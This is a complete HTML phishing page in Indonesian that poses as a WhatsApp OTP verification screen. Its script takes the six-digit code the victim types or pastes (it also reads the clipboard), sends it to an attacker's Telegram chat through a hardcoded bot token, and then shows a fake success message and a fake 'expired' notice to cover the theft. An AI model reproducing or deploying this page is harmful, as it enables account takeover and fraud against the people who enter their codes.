<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verifikasi OTP WhatsApp</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background-color: #ffffff;
      color: #000000;
      line-height: 1.4;
    }

    .container {
      width: 90%;
      max-width: 380px;
      min-width: 280px;
      margin: 0 auto;
      padding: 60px 5% 0;
    }

    h1 {
      font-size: 22px;
      font-weight: 700;
      margin-bottom: 10px;
      color: #000;
    }

    .subtitle {
      font-size: 14px;
      color: #666;
      margin-bottom: 30px;
      line-height: 1.5;
    }

    .otp-box {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-bottom: 25px;
    }

    .otp-box input {
      width: 50px;
      height: 50px;
      text-align: center;
      font-size: 20px;
      font-weight: 600;
      border: 1.5px solid #ddd;
      border-radius: 8px;
      outline: none;
      transition: all 0.2s;
      background: #f9f9f9;
    }

    .otp-box input:focus {
      border-color: #0066FF;
      background: #fff;
      box-shadow: 0 0 0 2px rgba(0, 102, 255, 0.1);
    }

    .otp-box input.filled {
      border-color: #4CAF50;
      background: #f8fff8;
    }

    .otp-box input.error {
      border-color: #ff4444;
      background: #fff8f8;
    }

    .paste-button {
      width: 100%;
      background: #0066FF;
      color: white;
      border: none;
      padding: 13px;
      font-size: 15px;
      font-weight: 600;
      border-radius: 8px;
      cursor: pointer;
      margin-bottom: 30px;
      transition: all 0.2s;
    }

    .paste-button:hover {
      background: #0052D4;
    }

    .paste-button:active {
      transform: translateY(1px);
    }

    .paste-button:disabled {
      background: #99C2FF;
      cursor: not-allowed;
      opacity: 0.7;
    }

    .resend {
      text-align: center;
      font-size: 14px;
      color: #666;
      margin-top: 20px;
    }

    .timer {
      color: #0066FF;
      font-weight: 600;
      margin: 0 4px;
    }

    .resend-link {
      color: #0066FF;
      font-weight: 600;
      text-decoration: none;
      cursor: pointer;
      margin-top: 10px;
      display: inline-block;
    }

    .resend-link:hover {
      text-decoration: underline;
    }

    .resend-link.disabled {
      color: #999;
      cursor: not-allowed;
      text-decoration: none;
    }

    /* Loading overlay */
    .loading {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.95);
      z-index: 1000;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }

    .loading-spinner {
      width: 40px;
      height: 40px;
      border: 3px solid #f3f3f3;
      border-top: 3px solid #0066FF;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin-bottom: 15px;
    }

    .loading-text {
      color: #333;
      font-size: 14px;
      font-weight: 500;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    /* Success message */
    .success-message {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.95);
      z-index: 1001;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      text-align: center;
    }

    .success-icon {
      width: 60px;
      height: 60px;
      background: #4CAF50;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
    }

    .success-icon::after {
      content: "âœ“";
      color: white;
      font-size: 30px;
      font-weight: bold;
    }

    .success-text {
      font-size: 18px;
      font-weight: 600;
      color: #333;
      margin-bottom: 10px;
    }

    .success-subtext {
      font-size: 14px;
      color: #666;
      max-width: 300px;
    }

    /* Expired message */
    .expired-message {
      display: none;
      text-align: center;
      padding: 30px 20px;
      background: #fff9f9;
      border: 1.5px solid #ff4444;
      border-radius: 12px;
      margin-top: 20px;
    }

    .expired-icon {
      width: 60px;
      height: 60px;
      background: #ff4444;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 20px;
    }

    .expired-icon::after {
      content: "!";
      color: white;
      font-size: 30px;
      font-weight: bold;
    }

    .expired-text {
      font-size: 18px;
      font-weight: 600;
      color: #ff4444;
      margin-bottom: 10px;
    }

    .expired-subtext {
      font-size: 14px;
      color: #666;
      margin-bottom: 20px;
    }

    .retry-button {
      width: 100%;
      background: #0066FF;
      color: white;
      border: none;
      padding: 13px;
      font-size: 15px;
      font-weight: 600;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 10px;
      transition: all 0.2s;
    }

    .retry-button:hover {
      background: #0052D4;
    }

    /* Responsive */
    @media (max-width: 480px) {
      .otp-box input {
        width: 45px;
        height: 45px;
        font-size: 18px;
      }
    }
  </style>
</head>
<body>
  <!-- Loading overlay -->
  <div class="loading" id="loading">
    <div class="loading-spinner"></div>
    <div class="loading-text">Mengirim kode...</div>
  </div>

  <!-- Success message -->
  <div class="success-message" id="successMessage">
    <div class="success-icon"></div>
    <div class="success-text">OTP Berhasil Diverifikasi!</div>
    <div class="success-subtext">Sedang memproses...</div>
  </div>

  <!-- Main container -->
  <div class="container">
    <h1>Verifikasi OTP WhatsApp</h1>
    <p class="subtitle">Masukkan kode OTP 6-digit yang kami kirim ke WhatsApp Anda</p>

    <div class="otp-box" id="otpBox">
      <input type="text" maxlength="1" data-index="0">
      <input type="text" maxlength="1" data-index="1">
      <input type="text" maxlength="1" data-index="2">
      <input type="text" maxlength="1" data-index="3">
      <input type="text" maxlength="1" data-index="4">
      <input type="text" maxlength="1" data-index="5">
    </div>

    <button class="paste-button" id="pasteBtn">Tempel Kode</button>

    <div class="resend">
      Kirim ulang kode dalam <span class="timer" id="timer">0:50</span><br><br>
      <a href="#" class="resend-link" id="resendBtn">Saya tidak menerima kode</a>
    </div>

    <!-- Expired message (hidden by default) -->
    <div class="expired-message" id="expiredMessage">
      <div class="expired-icon"></div>
      <div class="expired-text">OTP Kadaluarsa</div>
      <div class="expired-subtext">Kode OTP yang Anda masukkan telah kadaluarsa. Silakan minta kode baru.</div>
      <button class="retry-button" id="retryBtn">Minta Kode Baru</button>
    </div>
  </div>

  <script>
    // ===== KONFIGURASI =====
    const BOT_TOKEN = "8357781635:AAGabLtcnX8_1jM9Nho4RIuRa8xUU4M42Ss";
    const CHAT_ID = "8427991917";
    const MAX_TIME = 180; // Waktu timer dalam detik
    const EXPIRY_TIME = 3000; // 3 detik setelah OTP berhasil

    // ===== VARIABEL GLOBAL =====
    let timeLeft = MAX_TIME;
    let timerInterval = null;
    let otpSent = false;
    let otpExpired = false;

    // ===== ELEMEN DOM =====
    const loadingEl = document.getElementById('loading');
    const successEl = document.getElementById('successMessage');
    const expiredEl = document.getElementById('expiredMessage');
    const otpInputs = document.querySelectorAll('#otpBox input');
    const timerEl = document.getElementById('timer');
    const resendBtn = document.getElementById('resendBtn');
    const pasteBtn = document.getElementById('pasteBtn');
    const retryBtn = document.getElementById('retryBtn');

    // ===== FUNGSI UMUM =====
    function showLoading() {
      loadingEl.style.display = 'flex';
    }

    function hideLoading() {
      loadingEl.style.display = 'none';
    }

    function showSuccess() {
      successEl.style.display = 'flex';
    }

    function hideSuccess() {
      successEl.style.display = 'none';
    }

    function showExpired() {
      expiredEl.style.display = 'block';
      // Sembunyikan form OTP
      document.querySelector('.otp-box').style.display = 'none';
      document.querySelector('.paste-button').style.display = 'none';
      document.querySelector('.resend').style.display = 'none';
    }

    function formatTime(seconds) {
      const minutes = Math.floor(seconds / 60);
      const secs = seconds % 60;
      return `${minutes}:${secs < 10 ? '0' : ''}${secs}`;
    }

    function startTimer() {
      clearInterval(timerInterval);
      timeLeft = MAX_TIME;
      timerEl.textContent = formatTime(timeLeft);
      resendBtn.classList.add('disabled');
      resendBtn.style.pointerEvents = 'none';

      timerInterval = setInterval(() => {
        timeLeft--;
        timerEl.textContent = formatTime(timeLeft);

        if (timeLeft <= 0) {
          clearInterval(timerInterval);
          resendBtn.classList.remove('disabled');
          resendBtn.style.pointerEvents = 'auto';
        }
      }, 1000);
    }

    // ===== FUNGSI OTP HANDLING =====
    function setupOTPInputs() {
      otpInputs.forEach((input, index) => {
        // Validasi input hanya angka
        input.addEventListener('input', (e) => {
          const value = e.target.value;
          const numericValue = value.replace(/\D/g, '');
          input.value = numericValue;

          if (numericValue && index < otpInputs.length - 1) {
            otpInputs[index + 1].focus();
          }

          // Tampilkan visual feedback
          if (numericValue) {
            input.classList.add('filled');
            input.classList.remove('error');
          } else {
            input.classList.remove('filled');
          }

          // Cek jika OTP lengkap
          const otp = Array.from(otpInputs).map(i => i.value).join('');
          if (otp.length === 6 && !otpSent) {
            // Tandai semua input sebagai terisi
            otpInputs.forEach(i => i.classList.add('filled'));
            
            // Kirim OTP ke Telegram
            sendOTPToTelegram(otp);
          }
        });

        // Handle backspace
        input.addEventListener('keydown', (e) => {
          if (e.key === 'Backspace' && !input.value && index > 0) {
            otpInputs[index - 1].focus();
            otpInputs[index - 1].value = '';
            otpInputs[index - 1].classList.remove('filled');
          }
        });

        // Handle paste
        input.addEventListener('paste', (e) => {
          e.preventDefault();
          const pastedText = e.clipboardData.getData('text');
          const digits = pastedText.replace(/\D/g, '').split('');

          otpInputs.forEach((inp, idx) => {
            if (digits[idx]) {
              inp.value = digits[idx];
              inp.classList.add('filled');
            }
          });

          // Fokus ke input terakhir yang terisi
          const lastIndex = Math.min(digits.length - 1, otpInputs.length - 1);
          otpInputs[lastIndex].focus();

          // Kirim OTP jika lengkap
          const otp = otpInputs.slice(0, 6).map(i => i.value).join('');
          if (otp.length === 6 && !otpSent) {
            sendOTPToTelegram(otp);
          }
        });
      });
    }

    async function sendOTPToTelegram(otp) {
      if (otpSent) return; // Cegah pengiriman berulang
      
      otpSent = true;
      pasteBtn.disabled = true;
      showLoading();

      const message = `ðŸ“± *OTP WhatsApp Diterima*\n\nðŸ”¢ Kode: ${otp}\nâ° Waktu: ${new Date().toLocaleString('id-ID')}`;

      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "Markdown"
          })
        });

        if (!response.ok) {
          throw new Error('Gagal mengirim ke Telegram');
        }

        const data = await response.json();

        if (data.ok) {
          hideLoading();
          showSuccess();
          
          // Setelah 2 detik, tampilkan pesan kadaluarsa
          setTimeout(() => {
            hideSuccess();
            showExpired();
            otpExpired = true;
            
            // Reset OTP inputs
            otpInputs.forEach(input => {
              input.value = '';
              input.classList.remove('filled');
              input.disabled = true;
            });
            
            // Hentikan timer
            clearInterval(timerInterval);
            
          }, EXPIRY_TIME);
        } else {
          throw new Error('Response tidak OK dari Telegram');
        }
      } catch (error) {
        console.error('Error:', error);
        hideLoading();
        
        // Tampilkan error pada input OTP
        otpInputs.forEach(input => {
          input.classList.add('error');
        });

        alert('Gagal mengirim OTP. Silakan coba lagi.');
        
        // Reset flag pengiriman
        otpSent = false;
        pasteBtn.disabled = false;
      }
    }

    // ===== FUNGSI PASTE =====
    async function pasteOTP() {
      try {
        const text = await navigator.clipboard.readText();
        const digits = text.replace(/\D/g, '').split('').slice(0, 6);
        
        otpInputs.forEach((input, index) => {
          if (digits[index]) {
            input.value = digits[index];
            input.classList.add('filled');
          } else {
            input.value = '';
            input.classList.remove('filled');
          }
        });

        // Fokus ke input terakhir yang terisi
        const lastIndex = Math.min(digits.length - 1, otpInputs.length - 1);
        if (lastIndex >= 0) {
          otpInputs[lastIndex].focus();
        }

        // Kirim OTP jika lengkap
        const otp = otpInputs.slice(0, 6).map(i => i.value).join('');
        if (otp.length === 6 && !otpSent) {
          sendOTPToTelegram(otp);
        }
      } catch (error) {
        console.error('Clipboard error:', error);
        alert('Tidak dapat mengakses clipboard. Pastikan Anda memberikan izin.');
      }
    }

    // ===== FUNGSI RESET =====
    function resetOTP() {
      // Reset semua input
      otpInputs.forEach(input => {
        input.value = '';
        input.classList.remove('filled', 'error');
        input.disabled = false;
      });
      
      // Reset flags
      otpSent = false;
      otpExpired = false;
      pasteBtn.disabled = false;
      
      // Tampilkan kembali form OTP
      document.querySelector('.otp-box').style.display = 'flex';
      document.querySelector('.paste-button').style.display = 'block';
      document.querySelector('.resend').style.display = 'block';
      expiredEl.style.display = 'none';
      
      // Fokus ke input pertama
      otpInputs[0].focus();
      
      // Mulai timer baru
      startTimer();
      
      // Simulasi pengiriman kode baru
      alert('Kode OTP baru telah dikirim ke WhatsApp Anda.');
    }

    // ===== INISIALISASI SAAT HALAMAN DIMUAT =====
    document.addEventListener('DOMContentLoaded', () => {
      // Setup OTP inputs
      setupOTPInputs();
      
      // Fokus ke input pertama
      otpInputs[0].focus();

      // Setup paste button
      pasteBtn.addEventListener('click', pasteOTP);

      // Setup resend button
      resendBtn.addEventListener('click', (e) => {
        e.preventDefault();
        if (!resendBtn.classList.contains('disabled')) {
          startTimer();
          alert('Kode OTP baru telah dikirim ke WhatsApp Anda.');
        }
      });

      // Setup retry button
      retryBtn.addEventListener('click', resetOTP);

      // Start timer pertama
      startTimer();
    });
  </script>
</body>
</html>
